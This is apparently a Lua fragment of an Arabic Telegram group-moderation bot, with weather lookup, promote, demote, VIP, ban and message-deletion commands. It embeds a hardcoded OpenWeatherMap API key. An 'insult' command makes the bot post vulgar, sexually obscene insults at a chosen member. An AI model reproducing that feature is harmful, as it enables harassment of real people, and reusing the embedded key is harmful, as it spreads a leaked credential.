		MatchesEN = {text:match("^[/!#]([Ww][Ee][Aa][Tt][Hh][Ee][Rr]) (.*)$")}; MatchesFA = {text:match("^(طقس) (.*)$")}
		Ptrn = MatchesEN[2] or MatchesFA[2]
		local function temps(K)
			local F = (K*1.8)-459.67
			local C = K-273.15
			return F,C
		end
		
		local res = http.request("http://api.openweathermap.org/data/2.5/weather?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
		local jtab = json:decode(res)
		if jtab.name then
			if jtab.weather[1].main == "Thunderstorm" then
				status = "⛈ عاصف"
			elseif jtab.weather[1].main == "Drizzle" then
				status = "🌦 امطار خفيفه"
			elseif jtab.weather[1].main == "Rain" then
				status = "🌧 مطر شديد"
			elseif jtab.weather[1].main == "Snow" then
				status = "🌨 مثلج"
			elseif jtab.weather[1].main == "Atmosphere" then
				status = "🌫 مغبر"
			elseif jtab.weather[1].main == "Clear" then
				status = "🌤️ صاف"
			elseif jtab.weather[1].main == "Clouds" then
				status = "☁️ غائم"
			elseif jtab.weather[1].main == "Extreme" then
					status = "-------"
			elseif jtab.weather[1].main == "Additional" then
				status = "-------"
			else
				status = "-------"
			end
			local F1,C1 = temps(jtab.main.temp)
			local F2,C2 = temps(jtab.main.temp_min)
			local F3,C3 = temps(jtab.main.temp_max)
			if jtab.rain then
				rain = jtab.rain["3h"].." ميليمتر"
			else
				rain = "-----"
			end
			if jtab.snow then
				snow = jtab.snow["3h"].." ميليمتر"
			else
				snow = "-----"
			end
			today = "• اسم المدينه : *"..jtab.name.."*\n"
			.."• اسم الدوله : *"..(jtab.sys.country or "----").."*\n"
			.."• درجه الحراره :\n"
			.."   "..C1.."° سلليزي\n"
			.."   "..F1.."° فهرنهايت\n"
			.."   "..jtab.main.temp.."° كلفن\n"
			.."• الجو "..status.." تقريبا\n\n"
			.."• درجه حراره اليوم الصغرى : C"..C2.."°   F"..F2.."°   K"..jtab.main.temp_min.."°\n"
			.."• درجه حراره اليوم الكبرى : C"..C3.."°   F"..F3.."°   K"..jtab.main.temp_max.."°\n"
			.."• رطوبة الهواء : "..jtab.main.humidity.."%\n"
			.."• كثافه الغيوم : "..jtab.clouds.all.."%\n"
			.."• سرعه الرياح : "..(jtab.wind.speed or "------").." متر / ثانيه\n"
			.."• اتجاه الرياح : "..(jtab.wind.deg or "------").."° درجه\n"
			.."• تقلب الرياح : "..(jtab.main.pressure/1000).."\n"
			.."• اخر 3 ساعات من المطر : "..rain.."\n"
			.."• اخر 3 ساعات من تساقط الثلوج : "..snow.."\n\n"
			after = ""
			local res = http.request("http://api.openweathermap.org/data/2.5/forecast?q="..URL.escape(Ptrn).."&appid=269ed82391822cc692c9afd59f4aabba")
			local jtab = json:decode(res)
			for i=1,5 do
				local F1,C1 = temps(jtab.list[i].main.temp_min)
				local F2,C2 = temps(jtab.list[i].main.temp_max)
				if jtab.list[i].weather[1].main == "Thunderstorm" then
					status = "⛈ عاصف"
				elseif jtab.list[i].weather[1].main == "Drizzle" then
					status = "🌦 امطار خفيفه"
				elseif jtab.list[i].weather[1].main == "Rain" then
					status = "🌧 مطر شديد"
				elseif jtab.list[i].weather[1].main == "Snow" then
					status = "🌨 مثلج"
				elseif jtab.list[i].weather[1].main == "Atmosphere" then
					status = "🌫 مغبر"
				elseif jtab.list[i].weather[1].main == "Clear" then
					status = "🌤️صاف"
				elseif jtab.list[i].weather[1].main == "Clouds" then
					status = "☁️ غائم"
				elseif jtab.list[i].weather[1].main == "Extreme" then
					status = "-------"
				elseif jtab.list[i].weather[1].main == "Additional" then
					status = "-------"
				else
					status = "-------"
				end
				if i == 1 then
					day = "• طقس يوم غد"
				elseif i == 2 then
					day = "• طقس بعد غد"
				elseif i == 3 then
					day = "• طقس بعد 3 ايام"
				elseif i == 4 then
					day = "• طقس بعد 4 ايام"
				elseif i == 5 then
						day = "• طقس بعد 5 ايام"
				end
				after = after.."- "..day..status.." تقريبا \n🔺C"..C2.."°  *-*  F"..F2.."°\n🔻C"..C1.."°  *-*  F"..F1.."°\n"
			end
			Text = today.."• حاله الطقس ل5 ايام القادمه 🔽:\n"..after
			faederdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
		else
			Text  = "• لا توجد مدينه بهذا الاسم 🌐"
			faederdx(msg.chat_id_, msg.id_, 1, Text, 1, 'md')
		end
	end
	---------------faeder
        if (msg.sender_user_id_) then
          local text = msg.content_.text_:gsub("[Pp]rice", "Nerkh")
          if text:match("^[Nn]erkh$") or text:match("^المطور$") then
            local nerkh = database:get("nerkh")
            if nerkh then
              faederdx(msg.chat_id_, msg.id_, 1, nerkh, 1, "md")
            elseif database:get("lang:gp:" .. msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ Bot not found •", 1, "md")
            else
              faederdx(msg.chat_id_, msg.id_, 1, "🎖 ⁞ لم يتم وضع كليشه المطور •", 1, "md")
            end
          end
        end
        ---------------faeder

        if text and text:match('^هينه @(.*)')  then 
 local username = text:match('^هينه @(.*)') 
function faeder(extra,result,success)
 if result.id_ then  
if tonumber(result.id_) == tonumber(bot_id) then  
faederdx(msg.chat_id_, msg.id_, 1, 'يول شو تمسلت اكو واحد يهين نفسه ', 1, 'md')  
return false 
 end  
if tonumber(result.id_) == tonumber(bot_owner) then 
 faederdx(msg.chat_id_, msg.id_, 1, 'شو انت تمضرط تريد اهين تاج راسي مثلا ?', 1, 'md') 
 return false  
end  
local faeder = { "لك حيوان @"..username.." 100 نعال اسوكك بس تحجي فهمت ","لك فرخ @"..username.." اكل خره لا رجعك منين ما طلعت  ","حبيبي @"..username.." راح احاول احترمك هالمره بلكي تبطل حيونه ","فرخ دودكي  @"..username.." صير ادمي لا حطك بركبتي ",}
 faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'html') 
else  
faederdx(msg.chat_id_, msg.id_, 1, '💥*¦*  العضو لا يوجد في المجموعه ', 1, 'md') 
end 
end 
resolve_username(username,faeder)
end
------------------faeder
if text:match("^هينه$") then
function hena(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
 faederdx(msg.chat_id_, msg.id_, 1, '• شكد غبي لعد 🌚😂 تريدني اهين نفسي ؟ دكسمك 😌😂', 1, 'md') 
 return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, '• دي لك تريد اهين تاج راسك ؟ 🌚', 1, 'md')
  return false
  end 
local faeder = "• صار ستاذي 😌" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"• ها لك جرجف اليوم اكتلك واخري ع كبرك 😈","• حضينه مستنقع الجبات صير عاقل لا اهفك بالنعال 😒","• قاروره جاروره بلاع العيوره لا تندك باسيادك 😒","• خاب دي لا احط بكسمك الديفدي واركعك بعير ثري دي  فرخي ابن جبتي 😒"} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
 else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
 end
 if text:match("^بوسها$") or text:match("^بعد بوسها$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
 faederdx(msg.chat_id_, msg.id_, 1, '• حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
 return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, '• اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
  return false
  end 
local faeder = "• صار ستاذي راح اتماصص وياه 🙊😻" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"• تعالي حياتي خل نتماصص 😻👏","• اممممووووواااااح لصق الشفه 😻","• امح امح امح امح بوسه لو عسل 😼😻"} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
 else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
 end
 if text:match("^بوسه$") or text:match("^بعد بوسه$") or text:match("^ضل بوس$") then
function hena(extra, result, success)
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then 
 faederdx(msg.chat_id_, msg.id_, 1, '• حياتي بس فهمني شون ابوس نفسي وتدلل 😔😂', 1, 'md') 
 return false  
end  
if tonumber(result.sender_user_id_) == tonumber(bot_owner) then  
faederdx(msg.chat_id_, msg.id_, 1, '• اموووووووواح احلا بوسه لمطوري 😻', 1, 'md')
  return false
  end 
local faeder = "• صار ستاذي راح اتماصص وياه 🙊😻" 
faederdx(msg.chat_id_, msg.id_, 1,faeder, 1, 'md') 
local faeder = {"• تعالي حياتي خل نتماصص 😻👏","• اممممووووواااااح لصق الشفه 😻","• امح امح امح امح بوسه لو عسل 😼😻"} 
faederdx(msg.chat_id_, result.id_, 1,''..faeder[math.random(#faeder)]..'', 1, 'md') 
end 
if tonumber(msg.reply_to_message_id_) == 0 then
 else 
getMessage(msg.chat_id_, tonumber(msg.reply_to_message_id_),hena)   
end
 end
        ------------------------------------------faeder-----------------------------------------------------
        local text = msg.content_.text_:gsub('رفع ادمن','Promote')
        if text:match("^[Pp]romote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0  then
          function promote_by_reply(extra, result, success)
            local hash = 'bot:momod:'..msg.chat_id_
            if database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a moderator ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🚦|| تم رفعه ادمن سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه ادمن للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
              end
              database:sadd(hash, result.sender_user_id_)
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
        end
        -----------------------------------------faeder------------------------------------------------------
        if text:match("^[Pp]romote @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Pp]romote) @(.*)$")}
          function promote_by_username(extra, result, success)
            if result.id_ then
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to moderator ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه ادمن للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
              database:sadd('bot:momod:'..msg.chat_id_, result.id_)
            else
              if not database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
          end
          resolve_username(ap[2],promote_by_username)
        end
        -------------------------------------faeder----------------------------------------------------------
        if text:match("^[Pp]romote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local ap = {string.match(text, "^([Pp]romote) (%d+)$")}
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🚦|| تم رفعه ادمن للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
          end
          database:sadd('bot:momod:'..msg.chat_id_, ap[2])
        end
        -----------------------------------------faeder------------------------------------------------------
        local text = msg.content_.text_:gsub('تنزيل ادمن','Demote')
        if text:match("^[Dd]emote$") and is_owner(msg.sender_user_id_, msg.chat_id_) and msg.reply_to_message_id_ ~= 0 then
          function demote_by_reply(extra, result, success)
            local hash = 'bot:momod:'..msg.chat_id_
            if not database:sismember(hash, result.sender_user_id_) then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not promote ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه ادمن سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            else
              database:srem(hash, result.sender_user_id_)
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from promoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| الادمن ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
        end
        -------------------------------------------faeder----------------------------------------------------
        if text:match("^[Dd]emote @(.*)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:momod:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emote) @(.*)$")}
          function demote_by_username(extra, result, success)
            if result.id_ then
              if database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
              else
                texts = '🎈|| الادمن ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
              end
              database:srem(hash, result.id_)
            else
              if not database:get('lang:gp:'..msg.chat_id_) then
                texts = '*🎈|| Username is not correct ❎*'
              else
                texts = '*🎈|| المعرف غير صحيح ❎*'
              end
            end
            faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
          end
          resolve_username(ap[2],demote_by_username)
        end
        ------------------------------------------faeder-----------------------------------------------------
        if text:match("^[Dd]emote (%d+)$") and is_owner(msg.sender_user_id_, msg.chat_id_) then
          local hash = 'bot:momod:'..msg.chat_id_
          local ap = {string.match(text, "^([Dd]emote) (%d+)$")}
          if database:get('lang:gp:'..msg.chat_id_) then
            faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| was demoted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
          else
            faederdx(msg.chat_id_, msg.id_, 1, '🎈|| الادمن ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
          end
          database:srem(hash, ap[2])
        end
        -----------------------------------------faeder------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          local text = msg.content_.text_:gsub('رفع مميز','Setvip')
          if text:match("^[Ss]etvip$") and msg.reply_to_message_id_ ~= 0  then
            function promote_by_reply(extra, result, success)
              local hash = 'bot:vipmem:'..msg.chat_id_
              if database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is now a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| has been a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم رفعه عضو مميز بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
                database:sadd(hash, result.sender_user_id_)
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
          end
          ----------------------------------------faeder-------------------------------------------------------
          if text:match("^[Ss]etvip @(.*)$") then
            local ap = {string.match(text, "^([Ss]etvip) @(.*)$")}
            function promote_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| promoted to VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم رفعه عضو مميز للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:sadd('bot:vipmem:'..msg.chat_id_, result.id_)
              else
                if not database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
            end
            resolve_username(ap[2],promote_by_username)
          end
          -------------------------------faeder----------------------------------------------------------------
          if text:match("^[Ss]etvip (%d+)$") then
            local ap = {string.match(text, "^([Ss]etvip) (%d+)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| User ؛ '..ap[2]..' ، 🚷\n🎈|| has been a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم رفعه عضو مميز بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
            end
            database:sadd('bot:vipmem:'..msg.chat_id_, ap[2])
          end
          -------------------------------------faeder----------------------------------------------------------
          local text = msg.content_.text_:gsub('تنزيل مميز','Demvip')
          if text:match("^[Dd]emvip$") and msg.reply_to_message_id_ ~= 0 then
            function demote_by_reply(extra, result, success)
              local hash = 'bot:vipmem:'..msg.chat_id_
              if not database:sismember(hash, result.sender_user_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is not a VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| لم يتم رفعه مميز سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              else
                database:srem(hash, result.sender_user_id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| was removed from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| المميز ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
          end
          -----------------------------------------faeder------------------------------------------------------
          if text:match("^[Dd]emvip @(.*)$") then
            local hash = 'bot:vipmem:'..msg.chat_id_
            local ap = {string.match(text, "^([Dd]emvip) @(.*)$")}
            function demote_by_username(extra, result, success)
              if result.id_ then
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| was demoted from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                texts = '🎈|| المميز ؛ '..result.id_..' ، 🚷\n🎈|| تم تنزيله عضو للبوت بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
                database:srem(hash, result.id_)
              else
                if not database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
            end
            resolve_username(ap[2],demote_by_username)
          end
          --------------------------------faeder---------------------------------------------------------------
          if text:match("^[Dd]emvip (%d+)$") then
            local hash = 'bot:vipmem:'..msg.chat_id_
            local ap = {string.match(text, "^([Dd]emvip) (%d+)$")}
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The vip ؛ '..ap[2]..' ، 🚷\n🎈|| was removed from VIP member ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '🎈|| المميز ؛ '..ap[2]..' ، 🚷\n🎈|| تم تنزيله عضو اعتيادي بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ', 1, 'md')
            end
            database:srem(hash, ap[2])
          end
        end
        ----------------------------------------faeder---------------------------------------------------------------
        if text:match("^[Gg]p id$") or text:match("^ايدي المجموعه$") then
          if database:get('lang:gp:'..msg.chat_id_) then
            texts = "🚦⁞ Group ID ~ "..msg.chat_id_
          else
            texts = "🚦⁞ ايدي المجموعه ~ "..msg.chat_id_
          end
          faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
        end
        -------------------------------------faeder----------------------------------------------------------
      if text:match("^ايديي$") then 
  faederdx(msg.chat_id_, msg.id_, 1,'`'..msg.sender_user_id_..'`', 1, 'md') 
  end
  ----------faeder
        if text:match("^[Mm]y username$") or text:match("^معرفي$")  then
          function get_username(extra,result,success)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = '🚦⁞ Your Username ~ {User}'
            else
              text = '🚦⁞ معرفك ~ {User}'
            end
            local text = text:gsub('{User}',('@'..result.username_ or ''))
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          getUser(msg.sender_user_id_,get_username)
        end
        -------------------------------------faedee----------------------------------------------------------
        if text:match("^[Mm]y name$") or text:match("^اسمي$") then
          function get_firstname(extra,result,success)
            if database:get('lang:gp:'..msg.chat_id_) then
              text = '🚦⁞ your name ~ {firstname}'
            else
              text = '🚦⁞ اسمك ~ {firstname}'
            end
            local text = text:gsub('{firstname}',(result.first_name_ or ''))
            faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
          end
          getUser(msg.sender_user_id_,get_firstname)
        end
        -----------faeder
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Dd]el$") or text:match("^مسح$") and is_sudo(msg) and msg.reply_to_message_id_ ~= 0 then
            local id = msg.id_
            local msgs = {[0] = id}
            delete_msg(msg.chat_id_,{[0] = msg.reply_to_message_id_})
            delete_msg(msg.chat_id_,msgs)
          end
          -----------------------------------------faeder-----------------------------------------------------
          local text = msg.content_.text_:gsub('حظر','Ban') 
          if text:match("^[Bb]an$") and msg.reply_to_message_id_ ~= 0 then
            function ban_by_reply(extra, result, success)
              local hash = 'bot:banned:'..msg.chat_id_
              if not is_momod(result.sender_user_id_, result.chat_id_) then
                if database:sismember(hash, result.sender_user_id_) then
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| is already banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم حظره من المجموعه سابقا ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  end
                  chat_kick(result.chat_id_, result.sender_user_id_)
                else
                  database:sadd(hash, result.sender_user_id_)
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..result.sender_user_id_..' ، 🚷\n??|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..result.sender_user_id_..' ، 🚷\n🎈|| تم حظره من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
                  end
                  chat_kick(result.chat_id_, result.sender_user_id_)
                end
              end
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
          end
          ---------------------------------------faeder--------------------------------------------------------
          if text:match("^[Bb]an @(.*)$") then
            local ap = {string.match(text, "^([Bb]an) @(.*)$")}
            function ban_by_username(extra, result, success)
              if result.id_ then
                if not is_momod(result.id_, msg.chat_id_) then
                  database:sadd('bot:banned:'..msg.chat_id_, result.id_)
                  if database:get('lang:gp:'..msg.chat_id_) then
                    texts = '*🎈|| The User ؛ '..result.id_..' ، 🚷\n🎈|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                  else
                    texts = '🎈|| العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم حظره من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                  end
                  chat_kick(msg.chat_id_, result.id_)
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  texts = '*🎈|| Username is not correct ❎*'
                else
                  texts = '*🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
            end
            resolve_username(ap[2],ban_by_username)
          end
          ----------------------------------faeder-------------------------------------------------------------
          if text:match("^[Bb]an (%d+)$") then
            local ap = {string.match(text, "^([Bb]an) (%d+)$")}
            if not is_momod(ap[2], msg.chat_id_) then
              database:sadd('bot:banned:'..msg.chat_id_, ap[2])
              chat_kick(msg.chat_id_, ap[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| The User ؛ '..ap[2]..' ، 🚷\n🎈|| has been banned ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '*🎈|| العضو ؛ '..ap[2]..' ، 🚷\n🎈|| تم حظره من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*', 1, 'md')
              end
            end
          end
          -----------------------------------faeder------------------------------------------------------------
          local text = msg.content_.text_:gsub('مسح الكل','Delall')
          if text:match("^[Dd]elall$") and msg.reply_to_message_id_ ~= 0 then
            function delall_by_reply(extra, result, success)
              del_all_msgs(result.chat_id_, result.sender_user_id_)
              local id = msg.id_
              local msgs = {[0] = id}
              local chat = msg.chat_id_
              delete_msg(chat,msgs)
            end
            getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
          end
          ---------------------------------------faeder--------------------------------------------------------
          if text:match("^[Dd]elall (%d+)$") then
            local ass = {string.match(text, "^([Dd]elall) (%d+)$")}
            if not ass then
              return false
            else
              del_all_msgs(msg.chat_id_, ass[2])
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '> All messages from User : '..ass[2]..' has been deleted !', 1, 'html')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '✺❘ كل رسائل العضو : '..ass[2]..'\n ✺❘ تم حذفها ✅', 1, 'html')
              end
            end
          end
          -----------------------------------faeder------------------------------------------------------------
          if text:match("^[Dd]elall @(.*)$") then
            local ap = {string.match(text, "^([Dd]elall) @(.*)$")}
            function delall_by_username(extra, result, success)
              if result.id_ then
                del_all_msgs(msg.chat_id_, result.id_)
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| All messages from User ؛ '..result.id_..' ، 🚷\n🎈|| has been deleted ✅ \nֆ • • • • • • • • • • • • • • • • ֆ*'
                else
                  text = '🎈|| كل رسائل العضو ؛ '..result.id_..' ، 🚷\n🎈|| تم حذفها من المجموعه بنجاح ✅ \nֆ • • • • • • • • • • • • • • • • ֆ'
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  text = '*🎈|| Username is not correct ❎*'
                else
                  text = '🎈|| المعرف غير صحيح ❎*'
                end
              end
              faederdx(msg.chat_id_, msg.id_, 1, text, 1, 'html')
            end
            resolve_username(ap[2],delall_by_username)
          end
          -------------------------------------faeder----------------------------------------------------------
          local text = msg.content_.text_:gsub('الغاء حظر','Unban')
          if text:match("^[Uu]nban$") and msg.reply_to_message_id_ ~= 0 then
